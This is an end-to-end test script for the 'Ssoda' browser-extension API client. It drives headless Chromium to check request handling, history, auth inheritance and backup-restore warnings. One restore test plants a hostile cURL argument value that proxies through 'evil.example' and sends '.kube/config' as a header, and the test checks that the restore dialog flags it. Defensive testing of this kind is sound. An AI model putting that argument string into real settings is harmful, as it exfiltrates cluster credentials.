// Ssoda 확장을 실제 브라우저(Playwright Chromium, headless)에 올려 화면 동작 확인
// 실행: 저장소 최상위에서 node tests/e2e/ssoda/e2e.mjs   (다른 사본을 시험하려면 SSODA_EXT=<확장 폴더>)
// 요구 사항과 시험 내용은 tests/e2e/README.md 참고
import http from 'node:http';
import { spawn } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { findChromium, tempDir } from '../lib/chromium.mjs';

const extDir = path.resolve(process.env.SSODA_EXT || fileURLToPath(new URL('../../../ssoda', import.meta.url)));
const label = process.env.SSODA_EXT ? `ssoda (${extDir})` : 'ssoda';
const PROFILE = tempDir('ssoda-e2e-');
const CHROME = findChromium();
const DBG = Number(process.env.CDP_PORT) || 9303;
const EXT_ID = 'cnnlkogkbglbbbcefpaknbmebieabijo';
const APP = `chrome-extension://${EXT_ID}/app.html`;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/* ---------------- 시험용 서버 ---------------- */
const seen = [];
const hanging = new Set();
const server = http.createServer((req, res) => {
  let body = '';
  req.on('data', (d) => (body += d));
  req.on('end', () => {
    const u = new URL(req.url, 'http://x');
    seen.push({ method: req.method, path: u.pathname + u.search, headers: req.headers, body });
    const json = (o, code = 200) => {
      res.writeHead(code, { 'Content-Type': 'application/json' });
      res.end(typeof o === 'string' ? o : JSON.stringify(o));
    };
    if (u.pathname === '/echo') return json(body || '{}');
    if (u.pathname === '/big') return json('{"id":1234567890123456789,"price":0.10000000000000000555,"esc":"\\u003cb\\u003e"}');
    if (u.pathname === '/fast') return json({ fast: true });
    if (u.pathname === '/slow') return setTimeout(() => json({ slow: true }), 1500);
    if (u.pathname === '/auth') return json({ auth: req.headers.authorization || null });
    if (u.pathname === '/hang') {
      hanging.add(res);
      return;
    }
    if (u.pathname === '/sse') {
      res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache' });
      res.write('data: start\n\n');
      const t = setInterval(() => res.write('data: tick\n\n'), 300);
      req.on('close', () => clearInterval(t));
      res.on('close', () => clearInterval(t));
      hanging.add(res);
      return;
    }
    json({ path: u.pathname });
  });
});
await new Promise((r) => server.listen(0, '127.0.0.1', r));
const PORT = server.address().port;
const BASE = `http://127.0.0.1:${PORT}`;

/* ---------------- 브라우저 + CDP ---------------- */
fs.mkdirSync(PROFILE, { recursive: true });
const chrome = spawn(CHROME, [
  '--headless=new', `--remote-debugging-port=${DBG}`, `--user-data-dir=${PROFILE}`, `--load-extension=${extDir}`,
  `--disable-extensions-except=${extDir}`, '--no-first-run', '--no-default-browser-check', 'about:blank',
], { windowsHide: true, stdio: 'ignore' });
let ver;
for (let i = 0; i < 100 && !ver; i++) {
  await sleep(200);
  try {
    ver = await (await fetch(`http://127.0.0.1:${DBG}/json/version`)).json();
  } catch (e) { /* not yet */ }
}
if (!ver) throw new Error('chromium did not start');
const ws = new WebSocket(ver.webSocketDebuggerUrl);
await new Promise((r) => ws.addEventListener('open', r, { once: true }));
let nextId = 0;
const pending = new Map();
ws.addEventListener('message', (e) => {
  const m = JSON.parse(e.data);
  if (m.id && pending.has(m.id)) {
    const { resolve, reject } = pending.get(m.id);
    pending.delete(m.id);
    m.error ? reject(new Error(m.error.message)) : resolve(m.result);
  }
});
const send = (method, params = {}, sessionId) => new Promise((resolve, reject) => {
  const id = ++nextId;
  pending.set(id, { resolve, reject });
  ws.send(JSON.stringify({ id, method, params, sessionId }));
});
async function openPage(url) {
  const { targetId } = await send('Target.createTarget', { url });
  const { sessionId } = await send('Target.attachToTarget', { targetId, flatten: true });
  await send('Runtime.enable', {}, sessionId);
  return { targetId, sessionId };
}
async function ev(page, fn, ...args) {
  const expression = `(${fn})(...${JSON.stringify(args)})`;
  const r = await send('Runtime.evaluate', { expression, awaitPromise: true, returnByValue: true }, page.sessionId);
  if (r.exceptionDetails) throw new Error((r.exceptionDetails.exception && r.exceptionDetails.exception.description) || r.exceptionDetails.text);
  return r.result.value;
}
async function waitApp(page) {
  for (let i = 0; i < 100; i++) {
    const ok = await ev(page, () => !!(window.csApp && document.body && !document.body.classList.contains('booting'))).catch(() => false);
    if (ok) return;
    await sleep(100);
  }
  throw new Error('app did not boot');
}

const results = [];
async function check(name, fn) {
  try {
    const info = await fn();
    results.push({ name, ok: true });
    console.log(`PASS  ${name}${info ? '  — ' + info : ''}`);
  } catch (e) {
    results.push({ name, ok: false });
    console.log(`FAIL  ${name}  — ${String(e.message).split('\n')[0].slice(0, 300)}`);
  }
}
const assert = (cond, msg) => {
  if (!cond) throw new Error(msg);
};

const page = await openPage(APP);
await waitApp(page);
console.log(`=== ${label} ===`);

await check('Beautify 가 큰 정수·이스케이프·{{변수}}를 원문 그대로 둠', async () => {
  const r = await ev(page, async (base) => {
    const app = window.csApp;
    const tab = app.newRequestTab({ method: 'POST', url: base + '/echo', body: { mode: 'raw', rawLanguage: 'json', raw: '{"id":1234567890123456789,"n":{{num}},"s":"\\u003cb\\u003e {{name}}","list":[]}' } }, 'beautify');
    await new Promise((r) => setTimeout(r, 200));
    app.views.get(tab.id).beautify();
    return tab.draft.body.raw;
  }, BASE);
  assert(r.includes('1234567890123456789') && r.includes('"n": {{num}}') && r.includes('\\u003cb\\u003e {{name}}') && r.includes('\n  "list": []'), JSON.stringify(r));
});

await check('Beautify 후 전송한 Body 의 큰 정수가 서버에 그대로 도착', async () => {
  seen.length = 0;
  const r = await ev(page, async (base) => {
    const app = window.csApp;
    const tab = app.newRequestTab({ method: 'POST', url: base + '/echo', body: { mode: 'raw', rawLanguage: 'json', raw: '{"orderId":1234567890123456789,"amount":10.10}' } }, 'send-big');
    await new Promise((r) => setTimeout(r, 200));
    app.views.get(tab.id).beautify();
    const res = await app.send(tab, { engine: 'browser' });
    return { status: res.status, sent: tab.draft.body.raw };
  }, BASE);
  const got = seen.find((s) => s.path === '/echo');
  assert(r.status === 200 && got && got.body.includes('1234567890123456789') && got.body.includes('10.10'), JSON.stringify({ r, body: got && got.body }));
  return '서버가 받은 Body: ' + got.body.replace(/\s+/g, ' ');
});

await check('응답 Pretty 보기가 큰 정수·소수 자릿수를 바꾸지 않음', async () => {
  const text = await ev(page, async (base) => {
    const app = window.csApp;
    const tab = app.newRequestTab({ url: base + '/big' }, 'big');
    await new Promise((r) => setTimeout(r, 200));
    await app.send(tab, { engine: 'browser' });
    await new Promise((r) => setTimeout(r, 300));
    return app.views.get(tab.id).response.el.innerText;
  }, BASE);
  assert(text.includes('1234567890123456789') && text.includes('0.10000000000000000555') && !text.includes('1234567890123456800'), text.slice(0, 300));
});

await check('끝나지 않는 SSE 응답이 같은 서버로 가는 다음 요청을 막지 않음', async () => {
  const r = await ev(page, async (base) => {
    const app = window.csApp;
    const a = app.newRequestTab({ url: base + '/sse' }, 'sse');
    await new Promise((r) => setTimeout(r, 200));
    const pa = app.send(a, { engine: 'browser' });
    await new Promise((r) => setTimeout(r, 1000));
    const b = app.newRequestTab({ url: base + '/fast' }, 'fast');
    await new Promise((r) => setTimeout(r, 200));
    const t0 = performance.now();
    const rb = await Promise.race([app.send(b, { engine: 'browser' }), new Promise((r) => setTimeout(() => r({ stuck: true }), 6000))]);
    const ms = Math.round(performance.now() - t0);
    app.cancel(a);
    if (rb.stuck) app.cancel(b);
    await pa;
    return { ms, ok: !!rb.ok, status: rb.status, stuck: !!rb.stuck };
  }, BASE);
  assert(r.ok && r.status === 200 && r.ms < 3000, JSON.stringify(r));
  return `두 번째 요청 ${r.ms} ms`;
});

await check('응답 헤더가 오지 않는 요청 뒤의 요청: "기다리는 중" 표시 + 타임아웃에 대기 시간 포함', async () => {
  const r = await ev(page, async (base) => {
    const app = window.csApp;
    const a = app.newRequestTab({ url: base + '/hang' }, 'hang');
    await new Promise((r) => setTimeout(r, 200));
    const pa = app.send(a, { engine: 'browser' });
    await new Promise((r) => setTimeout(r, 500));
    const b = app.newRequestTab({ url: base + '/fast', settings: { timeout: 1500 } }, 'fast-timeout');
    await new Promise((r) => setTimeout(r, 200));
    const t0 = performance.now();
    const pb = Promise.race([app.send(b, { engine: 'browser' }), new Promise((r) => setTimeout(() => r({ stuck: true }), 6000))]);
    await new Promise((r) => setTimeout(r, 500));
    const waitingText = app.views.get(b.id).response.el.innerText;
    const rb = await pb;
    const ms = Math.round(performance.now() - t0);
    app.cancel(a);
    if (rb.stuck) app.cancel(b);
    await pa;
    return { waitingText, ms, code: rb.error && rb.error.code, msg: rb.error && rb.error.message, stuck: !!rb.stuck };
  }, BASE);
  assert(/같은 서버로 보낸 이전 요청을 기다리는 중/.test(r.waitingText), 'waiting text: ' + r.waitingText.slice(0, 120));
  assert(r.code === 'TIMEOUT' && /이전 요청/.test(r.msg) && r.ms < 4000, JSON.stringify({ code: r.code, msg: r.msg, ms: r.ms, stuck: r.stuck }));
  return `${r.ms} ms 뒤 "${r.msg}"`;
});

await check('히스토리에 보낸 시점의 요청이 남음 (응답 대기 중 편집해도)', async () => {
  const r = await ev(page, async (base) => {
    const app = window.csApp;
    const t = app.newRequestTab({ url: base + '/slow?x=sent' }, 'slow');
    await new Promise((r) => setTimeout(r, 200));
    const p = app.send(t, { engine: 'browser' });
    await new Promise((r) => setTimeout(r, 300));
    t.draft.url = base + '/slow?x=edited';
    app.markChanged(t);
    await p;
    return app.store.state.history[0].request.url;
  }, BASE);
  assert(/x=sent$/.test(r), r);
});

await check('히스토리에서 다시 연 요청이 컬렉션 인증(Inherit)과 컬렉션 변수를 유지', async () => {
  seen.length = 0;
  const r = await ev(page, async (base) => {
    const app = window.csApp;
    const tmp = app.newRequestTab({ url: base + '/{{path}}', auth: { type: 'inherit' } }, 'tmp');
    const request = JSON.parse(JSON.stringify(tmp.draft));
    await app.closeTab(tmp.id, { force: true });
    app.store.state.collections.push({
      id: 'col_e2e', name: 'E2E', description: '',
      auth: { type: 'bearer', bearer: { token: 'tok-123' }, basic: { username: '', password: '' }, apikey: { key: '', value: '', in: 'header' } },
      variables: [{ id: 'v1', key: 'path', value: 'auth', enabled: true, description: '' }],
      items: [{ id: 'req_e2e', type: 'request', name: 'auth req', request }],
    });
    app.store.changed('collections');
    const tab = app.openItem('req_e2e');
    await new Promise((r) => setTimeout(r, 200));
    const r1 = await app.send(tab, { engine: 'browser' });
    const entry = app.store.state.history[0];
    const t2 = app.openHistory(entry);
    await new Promise((r) => setTimeout(r, 200));
    const r2 = await app.send(t2, { engine: 'browser' });
    const dec = (res) => (res && res.ok ? new TextDecoder().decode(res.body) : (res && res.error && res.error.message));
    return { first: dec(r1), again: dec(r2), againUrl: r2.sentUrl };
  }, BASE);
  assert(/tok-123/.test(r.first) && /tok-123/.test(r.again) && /\/auth$/.test(r.againUrl), JSON.stringify(r));
});

await check('백업 복원 확인창에 cURL 실행 설정(추가 인자, -k)과 SSH 환경이 보임', async () => {
  const backup = {
    app: 'ssoda', version: 1,
    data: {
      collections: [{ id: 'c1', name: '공유받은 컬렉션', items: [{ id: 'r1', type: 'request', name: '주문 조회', request: { url: 'https://api.example.com/o', settings: { curl: { extra: '--proxy http://evil.example:8080 --proxy-header @.kube/config', insecure: true } } } }] }],
      environments: [{ id: 'e1', name: '운영1', variables: [], ssh: { enabled: true, host: '10.0.0.9', port: 22, user: 'app' } }],
      settings: {},
    },
  };
  const r = await ev(page, async (text) => {
    const before = window.csApp.store.state.collections.length;
    document.querySelector('.topbar button[title^="가져오기"]').click();
    await new Promise((r) => setTimeout(r, 300));
    const ta = document.querySelector('textarea.import-ta');
    ta.value = text;
    const btn = [...document.querySelectorAll('.modal button')].find((b) => b.textContent.trim() === '가져오기');
    btn.click();
    await new Promise((r) => setTimeout(r, 400));
    const dlg = [...document.querySelectorAll('.modal')].pop();
    const out = dlg.innerText;
    [...dlg.querySelectorAll('button')].find((b) => b.textContent.trim() === '취소').click();
    await new Promise((r) => setTimeout(r, 200));
    document.querySelectorAll('.modal-backdrop').forEach((b) => b.querySelector('.modal-x') && b.querySelector('.modal-x').click());
    return { out, unchanged: window.csApp.store.state.collections.length === before };
  }, JSON.stringify(backup));
  assert(/cURL 로 실행할 때 적용되는 설정이 있는 요청 1개/.test(r.out) && /--proxy http:\/\/evil\.example:8080/.test(r.out) && /-k \(SSL 인증서 검사 끔\)/.test(r.out) && /SSH 터널을 쓰는 환경 1개/.test(r.out) && !/kube/.test(r.out), r.out.slice(0, 400));
  assert(r.unchanged, '취소했는데 데이터가 바뀜');
});

await check('도우미가 구버전(v1.3.1)이면 도우미 창에 새 버전 안내', async () => {
  const r = await ev(page, async () => {
    const app = window.csApp;
    app.ui.helperStatus = async () => ({ ok: true, hostVersion: '1.3.1', curl: 'curl 8.22.0', path: 'C:\\Windows\\System32\\curl.exe' });
    const stale = await app.staleHostKeyInfo();
    app.ui.helperStatus = async () => ({ ok: true, hostVersion: '1.3.2', curl: 'curl 8.22.0', path: 'C:\\Windows\\System32\\curl.exe' });
    const fresh = await app.staleHostKeyInfo();
    app.ui.helperStatus = async () => ({ ok: true, hostVersion: '1.3.1', curl: 'curl 8.22.0', path: 'C:\\Windows\\System32\\curl.exe' });
    document.querySelector('.topbar button[title="설정"]').click();
    await new Promise((r) => setTimeout(r, 300));
    [...document.querySelectorAll('.modal button')].find((b) => /도우미 설정 열기/.test(b.textContent)).click();
    await new Promise((r) => setTimeout(r, 500));
    const box = document.querySelector('.helper-status');
    const text = box ? box.innerText : '';
    document.querySelectorAll('.modal-x').forEach((x) => x.click());
    return { stale, fresh, text };
  });
  assert(r.stale.code === 'HOST_OUTDATED' && !r.fresh.code, JSON.stringify({ stale: r.stale, fresh: r.fresh }));
  assert(/새 버전\(v1\.3\.2\)/.test(r.text), r.text.slice(0, 200));
});

await check('다른 서버로 리다이렉트될 때 그 서버로 가는 다른 요청이 진행 중이면 헤더가 섞일 수 있다고 경고', async () => {
  // 두 번째 서버(다른 host:port)
  const seen2 = [];
  const holds = new Set();
  const s2 = http.createServer((req, res) => {
    seen2.push({ path: req.url, headers: req.headers });
    if (req.url === '/hang') { holds.add(res); return; }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end('{"landed":true}');
  });
  await new Promise((r) => s2.listen(0, '127.0.0.1', r));
  const P2 = s2.address().port;
  const redirSrv = http.createServer((req, res) => {
    res.writeHead(302, { Location: `http://127.0.0.1:${P2}/landing` });
    res.end();
  });
  await new Promise((r) => redirSrv.listen(0, '127.0.0.1', r));
  const P1 = redirSrv.address().port;
  const r = await ev(page, async (p1, p2) => {
    const app = window.csApp;
    const b = app.newRequestTab({ url: `http://127.0.0.1:${p2}/hang`, cookies: [{ key: 'b', value: 'secret-of-B', enabled: true }] }, 'B');
    await new Promise((r) => setTimeout(r, 200));
    const pb = app.send(b, { engine: 'browser' });
    await new Promise((r) => setTimeout(r, 500));
    const a = app.newRequestTab({ url: `http://127.0.0.1:${p1}/start` }, 'A');
    await new Promise((r) => setTimeout(r, 200));
    const ra = await app.send(a, { engine: 'browser' });
    app.cancel(b);
    await pb;
    return { status: ra.status, warnings: ra.warnings || [] };
  }, P1, P2);
  const landed = seen2.find((s) => s.path === '/landing');
  for (const h of holds) h.destroy();
  s2.close();
  redirSrv.close();
  const mixed = !!(landed && /secret-of-B/.test(landed.headers.cookie || ''));
  const warned = r.warnings.some((w) => /섞였을 수 있습니다/.test(w));
  assert(warned, JSON.stringify({ r, mixed }));
  return `실제로 B 의 쿠키가 섞임=${mixed}, 경고 표시=${warned}`;
});

await check('앱 탭을 하나 더 열면 먼저 열린 탭은 저장을 멈추고 안내를 띄움', async () => {
  await ev(page, async () => {
    window.csApp.store.state.globals.variables.push({ id: 'g1', key: 'before', value: '1', enabled: true, description: '' });
    window.csApp.store.changed('globals');
    await window.csApp.store.flush();
    // 아직 저장되지 않은 변경(디바운스 대기 중)을 만든다: 자동 저장을 멈추고 pending 에만 올린다
    window.csApp.store._flush = () => {};
    window.csApp.store.state.globals.variables.push({ id: 'g0', key: 'unsaved-in-old-tab', value: '1', enabled: true, description: '' });
    window.csApp.store.changed('globals');
  });
  const page2 = await openPage(APP);
  await waitApp(page2);
  await sleep(500);
  const first = await ev(page, async () => {
    const blocked = !!document.querySelector('.instance-block');
    window.csApp.store.state.globals.variables.push({ id: 'g2', key: 'from-old-tab', value: 'x', enabled: true, description: '' });
    window.csApp.store.changed('globals');
    await window.csApp.store.flush();
    return { blocked, suspended: !!window.csApp.store.suspended, text: (document.querySelector('.instance-block') || {}).innerText || '' };
  });
  const stored = await ev(page2, async () => {
    const d = await chrome.storage.local.get('globals');
    return { keys: d.globals.variables.map((v) => v.key), loaded: window.csApp.store.state.globals.variables.map((v) => v.key), suspended: !!window.csApp.store.suspended };
  });
  await send('Target.closeTarget', { targetId: page2.targetId });
  assert(first.blocked && first.suspended, JSON.stringify(first));
  assert(!stored.keys.includes('from-old-tab') && stored.keys.includes('before') && !stored.suspended, JSON.stringify(stored));
  // 새 탭은 먼저 열린 탭이 마지막 변경을 저장한 뒤에 데이터를 읽었어야 한다
  assert(stored.loaded.includes('unsaved-in-old-tab'), '새 탭이 이전 탭의 마지막 변경 없이 열림: ' + JSON.stringify(stored.loaded));
  return first.text.split('\n')[0];
});

for (const res of hanging) try { res.destroy(); } catch (e) { /* */ }
server.close();
try { await send('Browser.close'); } catch (e) { /* */ }
chrome.kill();
await sleep(500);
fs.rmSync(PROFILE, { recursive: true, force: true });
const failed = results.filter((r) => !r.ok).length;
console.log(`\n${label}: ${results.length - failed}/${results.length} 통과`);
process.exit(failed ? 1 : 0);
